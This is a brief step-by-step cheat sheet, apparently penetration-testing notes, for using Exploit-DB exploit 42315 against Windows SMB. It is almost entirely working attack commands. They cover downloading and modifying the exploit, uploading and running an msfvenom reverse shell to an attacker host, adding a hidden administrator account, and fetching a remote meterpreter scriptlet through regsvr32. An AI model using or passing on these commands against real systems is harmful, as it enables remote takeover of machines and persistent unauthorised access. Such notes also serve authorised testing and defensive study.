1.Download the exploit
wget https://www.exploit-db.com/download/42315

2.Download python library MYSMB
wget https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/42315.py -O mysmb.py

3.Exploit modifications
* For anonymous smb connection
- 42315.py line 34:
original: USERNAME = ''
modified: USERNAME = '//'

line 920 add payload...

# Variation 1
- 42315.py line 920:
smb_send_file(smbConn, './revshell.exe', 'C', '/exp.exe')
service_exec(conn, r'cmd /c c:\\exp.exe')

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o revshell.exe


# Variation 2
- 42315.py line 920:
service_exec(conn, r'net user /add rosonsec P@ssw0rd && net localgroup administrators rosonsec /add')

# Variation 3
wget ttps://raw.githubusercontent.com/CroweCybersecurity/ps1encode/master/ps1encode.rb
ruby ps1encode.rb --LHOST 10.10.10.10 --LPORT 4444 --PAYLOAD windows/meterpreter/reverse_tcp -t sct
chmod +x index.sct
python -m SimpleHttpServer 80

- 42315.py line 920:
service_exec(conn, r'regsvr32 /s /n /u /i:http://10.10.10.10/index.sct scrobj.dll')

4. Exploit it!
*Possible pipes = [ 'browser', 'spoolss', 'netlogon', 'lsarpc', 'samr' ]
python 42315.py 10.10.10.11 samr
